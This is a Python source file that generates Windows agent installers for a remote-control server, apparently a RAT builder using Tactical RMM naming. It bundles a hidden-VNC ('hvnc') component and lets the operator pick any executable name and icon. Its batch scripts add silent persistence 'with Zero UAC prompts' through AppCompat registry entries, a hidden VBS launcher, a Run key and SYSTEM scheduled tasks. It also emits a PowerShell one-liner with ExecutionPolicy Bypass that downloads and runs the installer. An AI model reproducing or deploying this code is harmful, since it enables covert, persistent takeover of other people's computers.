"""
Dynamic Agent Package & Standalone Setup Installer Generator.
Bakes custom configuration into standalone setup executables (.exe) bundling the precompiled native runtime.
"""

import os
import sys
import json
import uuid
import shutil
import zipfile
import base64
import io
import logging
from typing import Dict, Any, Optional
from PIL import Image

from .setup_compiler import SetupCompiler

logger = logging.getLogger("master_hub.generator")

ROOT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DIST_AGENT_DIR = os.path.join(ROOT_DIR, "dist", "TRMM_Agent")
OUTPUT_DIR = os.path.join(ROOT_DIR, "generated_agents")
os.makedirs(OUTPUT_DIR, exist_ok=True)


def process_custom_icon(base64_data: str, out_dir: str) -> Optional[str]:
    """
    Converts user-uploaded image data (PNG/JPG/ICO/WebP) to standard multi-resolution Windows .ico
    with dimensions 256x256, 128x128, 64x64, 48x48, 32x32, and 16x16.
    If the uploaded file is already a valid .ico file, writes it directly to preserve all native layers.
    """
    try:
        if not base64_data:
            return None
        if "," in base64_data:
            base64_data = base64_data.split(",", 1)[1]
        raw_bytes = base64.b64decode(base64_data)
        icon_path = os.path.join(out_dir, f"app_icon_{uuid.uuid4().hex[:6]}.ico")

        # Check if already a native Windows .ico file (magic \x00\x00\x01\x00)
        if raw_bytes[:4] == b"\x00\x00\x01\x00":
            with open(icon_path, "wb") as f:
                f.write(raw_bytes)
            logger.info(f"Native Windows .ico preserved: {icon_path} ({len(raw_bytes)} bytes)")
            return icon_path

        img = Image.open(io.BytesIO(raw_bytes))
        img = img.convert("RGBA")
        # Ensure highest quality base 256x256 frame
        base_img = img.resize((256, 256), Image.Resampling.LANCZOS)
        icon_sizes = [(256, 256), (128, 128), (64, 64), (48, 48), (32, 32), (16, 16)]
        base_img.save(icon_path, format="ICO", sizes=icon_sizes)
        logger.info(f"Custom multi-resolution Windows icon generated: {icon_path}")
        return icon_path
    except Exception as e:
        logger.warning(f"Could not convert custom icon: {e}")
        return None


class AgentGenerator:
    """Generates custom-configured agent packages and standalone installers."""

    @staticmethod
    def build_package(config: Dict[str, Any]) -> Dict[str, Any]:
        """
        Builds a customized deployment package embedding the standalone native executable.
        """
        agent_id = config.get("agent_id") or str(uuid.uuid4())[:8]
        arch = config.get("arch", "x64")
        server_url = config.get("server_url", "ws://127.0.0.1:8000")
        clean_ws_url = server_url.rstrip("/").replace("http://", "ws://").replace("https://", "wss://")
        while clean_ws_url.endswith("/ws"):
            clean_ws_url = clean_ws_url[:-3].rstrip("/")
        server_url = clean_ws_url

        auto_start = config.get("auto_start", True)
        endpoint_tag = config.get("endpoint_tag", f"Agent-{agent_id}").replace(" ", "_")

        # Derive HTTP URL from server_url for downloads
        http_server_url = server_url.replace("ws://", "http://").replace("wss://", "https://")

        build_dir = os.path.join(OUTPUT_DIR, f"build_{agent_id}")
        if os.path.exists(build_dir):
            shutil.rmtree(build_dir)
        os.makedirs(build_dir, exist_ok=True)

        # 1. Copy compiled standalone binary if present, otherwise copy source files
        if os.path.isdir(DIST_AGENT_DIR) and os.path.isfile(os.path.join(DIST_AGENT_DIR, "TRMM_Agent.exe")):
            shutil.copytree(DIST_AGENT_DIR, build_dir, dirs_exist_ok=True)
        else:
            # Fallback to source copying
            hvnc_src = os.path.join(ROOT_DIR, "hvnc")
            hvnc_dst = os.path.join(build_dir, "hvnc")
            shutil.copytree(hvnc_src, hvnc_dst, ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
            agent_client_src = os.path.join(ROOT_DIR, "agent_client")
            agent_client_dst = os.path.join(build_dir, "agent_client")
            shutil.copytree(agent_client_src, agent_client_dst, ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))

        # 2. Write custom baked config.json
        agent_config = {
            "agent_id": agent_id,
            "endpoint_tag": endpoint_tag,
            "server_url": server_url,
            "arch": arch,
            "auto_start": auto_start,
            "reconnect_interval_sec": 5,
            "heartbeat_interval_sec": 10,
        }
        with open(os.path.join(build_dir, "config.json"), "w", encoding="utf-8") as f:
            json.dump(agent_config, f, indent=4)

        # Derive dynamic application naming
        custom_name = (config.get("custom_name") or "").strip()
        if custom_name:
            clean = custom_name
            if clean.lower().endswith(".exe"):
                clean = clean[:-4]
            clean = "".join(c for c in clean if c.isalnum() or c in ("-", "_", " ")).strip()
            app_name = clean if clean else f"Agent_{endpoint_tag}"
            app_title = clean.title() if clean else f"Agent ({endpoint_tag})"
        else:
            app_name = f"Agent_{endpoint_tag}"
            app_title = f"Agent ({endpoint_tag})"

        # 3. Create install.bat for the zip package
        install_bat = f"""@echo off
set "INSTALL_DIR=C:\\Program Files\\{app_name}_{agent_id}"

echo [*] Terminating previous {app_title} processes...
taskkill /F /IM {app_name}.exe 2>nul
taskkill /F /IM TRMM_Agent.exe 2>nul
timeout /t 1 /nobreak >nul 2>&1

echo [*] Cleaning up old startup shortcuts...
del /f /q "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{app_name}*.lnk" 2>nul
del /f /q "%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{app_name}*.lnk" 2>nul
del /f /q "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\TRMM_Agent*.lnk" 2>nul
del /f /q "%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\TRMM_Agent*.lnk" 2>nul

mkdir "%INSTALL_DIR%" 2>nul
xcopy /E /Y /I "%~dp0*" "%INSTALL_DIR%\\" >nul

if exist "%INSTALL_DIR%\\TRMM_Agent.exe" if not exist "%INSTALL_DIR%\\{app_name}.exe" (
    ren "%INSTALL_DIR%\\TRMM_Agent.exe" "{app_name}.exe"
)

{"" if not auto_start else f'''echo [*] Configuring silent auto-start persistence (Zero UAC prompts)...
powershell -NoProfile -Command "Unblock-File -Path '%INSTALL_DIR%\\{app_name}.exe'" >nul 2>&1
reg add "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers" /v "%INSTALL_DIR%\\{app_name}.exe" /t REG_SZ /d "~ RUNASINVOKER" /f >nul 2>&1
reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers" /v "%INSTALL_DIR%\\{app_name}.exe" /t REG_SZ /d "~ RUNASINVOKER" /f >nul 2>&1
reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{app_name}" /f >nul 2>&1
reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "TRMM_Agent" /f >nul 2>&1
powershell -NoProfile -Command "$vbs = [Environment]::GetFolderPath('Startup') + '\\{app_name}.vbs'; $c = @('Set ws = CreateObject(\"WScript.Shell\")', 'ws.Environment(\"Process\")(\"__COMPAT_LAYER\") = \"RunAsInvoker\"', 'ws.Run \"\"\"%INSTALL_DIR%\\{app_name}.exe\"\"\", 0, False'); [IO.File]::WriteAllLines($vbs, $c); Unblock-File -Path $vbs" >nul 2>&1
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{app_name}" /t REG_SZ /d "wscript.exe \\"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{app_name}.vbs\\"" /f >nul 2>&1
schtasks /Create /TN "{app_name}_Persist" /TR "\\"%INSTALL_DIR%\\{app_name}.exe\\"" /SC ONSTART /RU SYSTEM /RL HIGHEST /DELAY 0000:10 /F >nul 2>&1
schtasks /Create /TN "{app_name}_User" /TR "\\"%INSTALL_DIR%\\{app_name}.exe\\"" /SC ONLOGON /RL HIGHEST /F >nul 2>&1
'''}

start "" "%INSTALL_DIR%\\{app_name}.exe"
echo [OK] {app_title} is active!
"""
        with open(os.path.join(build_dir, "install.bat"), "w", encoding="utf-8") as f:
            f.write(install_bat)

        # 4. Compress into zip package
        zip_filename = f"{app_name}_{endpoint_tag}_{arch}.zip"
        zip_path = os.path.join(OUTPUT_DIR, zip_filename)
        if os.path.exists(zip_path):
            os.remove(zip_path)

        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(build_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, build_dir)
                    zipf.write(file_path, arcname)

        shutil.rmtree(build_dir)

        # 5. Process optional custom software logo / icon and custom executable name
        icon_base64 = config.get("icon_base64")
        icon_path = None
        if icon_base64:
            icon_path = process_custom_icon(icon_base64, OUTPUT_DIR)

        # 6. Compile Standalone Setup Executable (.exe)
        setup_exe_path = SetupCompiler.compile_installer(
            zip_path, agent_id, endpoint_tag, arch,
            custom_name=custom_name, icon_path=icon_path
        )
        setup_exe_filename = os.path.basename(setup_exe_path) if setup_exe_path else None

        # 7. Create Single-File Bootstrap Installer (.bat)
        download_url = f"{http_server_url}/api/agents/download/{zip_filename}"
        bootstrap_filename = f"install_{app_name}.bat"
        bootstrap_path = os.path.join(OUTPUT_DIR, bootstrap_filename)

        bootstrap_script = f"""@echo off
setlocal enabledelayedexpansion
title {app_title} Setup — {endpoint_tag}

echo [*] Terminating previous {app_title} processes...
taskkill /F /IM {app_name}.exe 2>nul
taskkill /F /IM TRMM_Agent.exe 2>nul
timeout /t 1 /nobreak >nul 2>&1

echo [*] Cleaning up old startup shortcuts...
del /f /q "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{app_name}*.lnk" 2>nul
del /f /q "%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{app_name}*.lnk" 2>nul
del /f /q "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\TRMM_Agent*.lnk" 2>nul
del /f /q "%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\TRMM_Agent*.lnk" 2>nul

set "INSTALL_DIR=C:\\Program Files\\{app_name}_{agent_id}"
set "TEMP_ZIP=%TEMP%\\{app_name.lower()}_{agent_id}.zip"

echo [*] Downloading {app_title} package...
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '{download_url}' -OutFile '%TEMP_ZIP%'"

echo [*] Extracting package to %INSTALL_DIR%...
mkdir "%INSTALL_DIR%" 2>nul
powershell -Command "Expand-Archive -Path '%TEMP_ZIP%' -DestinationPath '%INSTALL_DIR%' -Force"
del /f /q "%TEMP_ZIP%" 2>nul

if exist "%INSTALL_DIR%\\TRMM_Agent.exe" if not exist "%INSTALL_DIR%\\{app_name}.exe" (
    ren "%INSTALL_DIR%\\TRMM_Agent.exe" "{app_name}.exe"
)

{"" if not auto_start else f'''echo [*] Configuring silent auto-start persistence (Zero UAC prompts)...
powershell -NoProfile -Command "Unblock-File -Path '%INSTALL_DIR%\\{app_name}.exe'" >nul 2>&1
reg add "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers" /v "%INSTALL_DIR%\\{app_name}.exe" /t REG_SZ /d "~ RUNASINVOKER" /f >nul 2>&1
reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers" /v "%INSTALL_DIR%\\{app_name}.exe" /t REG_SZ /d "~ RUNASINVOKER" /f >nul 2>&1
reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{app_name}" /f >nul 2>&1
reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "TRMM_Agent" /f >nul 2>&1
powershell -NoProfile -Command "$vbs = [Environment]::GetFolderPath('Startup') + '\\{app_name}.vbs'; $c = @('Set ws = CreateObject(\"WScript.Shell\")', 'ws.Environment(\"Process\")(\"__COMPAT_LAYER\") = \"RunAsInvoker\"', 'ws.Run \"\"\"%INSTALL_DIR%\\{app_name}.exe\"\"\", 0, False'); [IO.File]::WriteAllLines($vbs, $c); Unblock-File -Path $vbs" >nul 2>&1
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{app_name}" /t REG_SZ /d "wscript.exe \\"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{app_name}.vbs\\"" /f >nul 2>&1
schtasks /Create /TN "{app_name}_Persist" /TR "\\"%INSTALL_DIR%\\{app_name}.exe\\"" /SC ONSTART /RU SYSTEM /RL HIGHEST /DELAY 0000:10 /F >nul 2>&1
schtasks /Create /TN "{app_name}_User" /TR "\\"%INSTALL_DIR%\\{app_name}.exe\\"" /SC ONLOGON /RL HIGHEST /F >nul 2>&1
'''}

start "" "%INSTALL_DIR%\\{app_name}.exe"
echo [OK] {app_title} is active!
"""
        with open(bootstrap_path, "w", encoding="utf-8") as f:
            f.write(bootstrap_script)

        logger.info(f"Generated standalone installer: {setup_exe_path}")
        logger.info(f"Generated agent zip: {zip_path}")

        return {
            "exe_path": setup_exe_path,
            "exe_filename": setup_exe_filename,
            "exe_download_url": f"/api/agents/download/{setup_exe_filename}" if setup_exe_filename else None,
            "zip_path": zip_path,
            "zip_filename": zip_filename,
            "zip_download_url": f"/api/agents/download/{zip_filename}",
            "bootstrap_path": bootstrap_path,
            "bootstrap_filename": bootstrap_filename,
            "bootstrap_download_url": f"/api/agents/bootstrap/{bootstrap_filename}",
            "one_liner": f"powershell -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri '{http_server_url}/api/agents/bootstrap/{bootstrap_filename}' -OutFile '%TEMP%\\install.bat'; & '%TEMP%\\install.bat'\"",
        }
